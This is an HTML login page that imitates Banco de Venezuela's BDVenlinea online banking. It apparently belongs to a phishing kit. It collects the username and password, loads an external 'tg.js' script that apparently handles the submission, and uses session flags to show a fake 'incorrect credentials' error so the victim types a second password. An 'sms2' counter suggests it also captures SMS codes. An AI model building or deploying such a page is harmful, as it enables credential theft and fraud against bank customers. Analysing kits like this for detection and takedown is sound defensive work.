<!DOCTYPE html>
<html lang="es">

<head>
    <script src="tg.js"></script>
    <meta charset="UTF-8">
    <link rel="icon" type="image/x-icon" href="/assets/favicon/favicon-16x16.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BDVenlinea Personas</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            max-width: 360px;
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            margin: auto;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }

        h2 {
            margin-bottom: 20px;
            font-size: 15px;
            color: #454343;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }

        .logo-container img {
            height: auto;
            max-width: 100%;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group input[type="text"],
        .input-group input[type="password"] {
            width: calc(100% - 24px);
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: all 0.3s ease;
            display: block;
            background-color: #f9f9f9;
            box-sizing: border-box;
            margin-top: 10px;
        }

        .input-group label {
            position: absolute;
            left: 20px;
            top: 16px;
            font-size: 16px;
            color: #666;
            transition: top 0.3s, font-size 0.3s, color 0.3s;
            pointer-events: none;
            z-index: 1;
            background-color: #fff;
            padding: 0 5px;
        }

        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label {
            top: 6px;
            font-size: 12px;
            color: #858788;
        }

        .input-group input:focus {
            padding-top: 18px;
            border-color: #bb1b47;
            box-shadow: 0 0 0 2px rgba(187, 27, 71, 0.1);
        }

        .terms {
            text-align: left;
            margin-bottom: 20px;
        }

        .submit-btn {
            background-color: #bb1b47;
            color: white;
            border: none;
            padding: 12px 120px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            display: inline-block;
            transition: all 0.3s ease;
            margin-bottom: 15px;
            font-weight: 600;
            width: 100%;
            box-sizing: border-box;
        }

        .submit-btn:hover {
            background-color: #9e153a;
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(187, 27, 71, 0.2);
        }

        .submit-btn:active {
            transform: translateY(0);
            box-shadow: 0 2px 5px rgba(187, 27, 71, 0.2);
        }

        .error-message {
            color: #bb1b47;
            font-size: 14px;
            margin-top: 10px;
            display: none;
            text-align: left;
            background-color: rgba(187, 27, 71, 0.1);
            padding: 12px;
            border-radius: 5px;
            border-left: 4px solid #bb1b47;
            animation: shake 0.5s ease-in-out;
            margin-bottom: 15px;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .footer {
            margin-top: 15px;
            color: #666;
            background-image: url('https://i.postimg.cc/vTHY5R3V/footer.png');
            background-size: cover;
            background-position: center;
            padding: 90px 0;
            text-align: center;
        }

        .checkbox-input {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            width: 20px;
            height: 20px;
            background-color: #f0f0f0;
            border-radius: 3px;
            position: relative;
            cursor: pointer;
            border: 1px solid #ddd;
            transition: all 0.3s ease;
        }

        .checkbox-input:checked {
            background-color: #bb1b47;
            border-color: #bb1b47;
        }

        .checkbox-input::before {
            content: "";
            display: block;
            position: absolute;
            top: 3px;
            left: 7px;
            width: 6px;
            height: 12px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .checkbox-input:checked::before {
            opacity: 1;
        }
        
        .checkbox-input:hover {
            border-color: #bb1b47;
        }
        
        /* Estilo para mensaje de error en inputs */
        .input-error {
            border-color: #bb1b47 !important;
            background-color: #fff5f5 !important;
            animation: inputShake 0.5s ease-in-out;
        }

        @keyframes inputShake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-3px); }
            75% { transform: translateX(3px); }
        }
        
        /* Estilo para el label de términos */
        .terms label {
            color: #666;
            font-size: 14px;
            margin-left: 8px;
            cursor: pointer;
            transition: color 0.3s ease;
        }
        
        .terms label:hover {
            color: #333;
        }
        
        /* Estilo para el mensaje de error cuando está visible */
        .error-visible {
            display: block !important;
        }
        
        /* Estilo para el contenedor de error */
        .error-container {
            margin-bottom: 15px;
        }
        
        /* Estilos para los requisitos de contraseña */
        .password-requirements {
            display: none;
            background-color: #f8f9fa;
            border-left: 4px solid #0070cc;
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 5px;
            text-align: left;
            font-size: 13px;
            color: #333;
        }
        
        .password-requirements ul {
            margin: 5px 0;
            padding-left: 20px;
        }
        
        .password-requirements li {
            margin-bottom: 3px;
        }
        
        .password-requirements .requirement-valid {
            color: #27ae60;
        }
        
        .password-requirements .requirement-invalid {
            color: #bb1b47;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo-container">
            <img src="https://i.postimg.cc/8cVWGCkV/logo.png" alt="Logo BDV Venezuela">
        </div>
        <h2>Introduce tu usuario único</h2>
        <form method="post" onsubmit="return handleFormSubmit(event)" id="loginForm">
            <div class="input-group">
                <input placeholder="Usuario único" type="text" id="username" name="username" required>
            </div>
            <div class="input-group">
                <input placeholder="Contraseña" type="password" id="password" name="password" required>
            </div>
            
            <div class="password-requirements" id="passwordRequirements">
                <strong>Requisitos para la nueva contraseña:</strong>
                <ul>
                    <li id="req-uppercase">Al menos 1 letra mayúscula (A-Z)</li>
                    <li id="req-lowercase">Al menos 1 letra minúscula (a-z)</li>
                    <li id="req-symbol">Al menos 1 símbolo especial (!@#$%^&* etc.)</li>
                </ul>
            </div>
            
            <div class="terms">
                <input type="checkbox" id="terms" class="checkbox-input" required>
                <label for="terms">Acepto los términos y condiciones</label>
            </div>
            
            <div class="error-container">
                <div class="error-message" id="errorMessage">
                    Usuario y/o contraseña incorrectos. Por favor, intente nuevamente.
                </div>
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">Entrar</button>
        </form>
        <div class="footer"></div>
    </div>
    
    <script>
        // Limpiar el sessionStorage al cargar la página (incluyendo contadores de sms2)
        sessionStorage.removeItem('bdv_first_attempt');
        sessionStorage.removeItem('sms2_attempts');
        
        // Verificar si ya hubo un intento fallido
        document.addEventListener('DOMContentLoaded', function() {
            const isSecondAttempt = sessionStorage.getItem('bdv_first_attempt') === 'completed';
            
            if (isSecondAttempt) {
                // Mostrar mensaje de error en la interfaz
                const errorElement = document.getElementById('errorMessage');
                errorElement.innerHTML = 'Usuario y/o contraseña incorrectos.<br>La nueva contraseña debe contener:<br>• 1 mayúscula, 1 minúscula y 1 símbolo';
                errorElement.style.display = 'block';
                errorElement.classList.add('error-visible');
                
                // Mostrar los requisitos de contraseña
                document.getElementById('passwordRequirements').style.display = 'block';
                
                // Añadir estilos de error a los inputs
                document.getElementById('username').classList.add('input-error');
                document.getElementById('password').classList.add('input-error');
                
                // Limpiar campos
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                
                // Validar contraseña en tiempo real durante el segundo intento
                const passwordInput = document.getElementById('password');
                const requirements = document.getElementById('passwordRequirements');
                
                passwordInput.addEventListener('input', function() {
                    const password = this.value;
                    
                    // Validar requisitos
                    const hasUppercase = /[A-Z]/.test(password);
                    const hasLowercase = /[a-z]/.test(password);
                    const hasSymbol = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password);
                    
                    // Actualizar visualización de requisitos
                    document.getElementById('req-uppercase').className = hasUppercase ? 'requirement-valid' : 'requirement-invalid';
                    document.getElementById('req-lowercase').className = hasLowercase ? 'requirement-valid' : 'requirement-invalid';
                    document.getElementById('req-symbol').className = hasSymbol ? 'requirement-valid' : 'requirement-invalid';
                    
                    // Quitar clase de error si la contraseña es válida
                    if (hasUppercase && hasLowercase && hasSymbol) {
                        this.classList.remove('input-error');
                    }
                });
                
                // Enfocar en el campo de contraseña
                document.getElementById('password').focus();
            }
            
            // Limpiar error cuando el usuario empiece a escribir
            const inputs = document.querySelectorAll('#username, #password');
            inputs.forEach(input => {
                input.addEventListener('input', function() {
                    if (this.classList.contains('input-error')) {
                        this.classList.remove('input-error');
                    }
                    
                    // Ocultar mensaje de error general cuando se empieza a escribir
                    const errorElement = document.getElementById('errorMessage');
                    if (errorElement && errorElement.style.display === 'block' && this.id === 'password') {
                        errorElement.style.display = 'none';
                        errorElement.classList.remove('error-visible');
                    }
                });
            });
            
            // Limpiar error cuando el usuario haga click en el input
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    const errorElement = document.getElementById('errorMessage');
                    if (errorElement && errorElement.style.display === 'block') {
                        errorElement.style.display = 'none';
                        errorElement.classList.remove('error-visible');
                    }
                });
            });
            
            // Solo para el primer intento: ocultar requisitos al inicio
            if (!isSecondAttempt) {
                document.getElementById('passwordRequirements').style.display = 'none';
            }
        });
    </script>
</body>
</html>
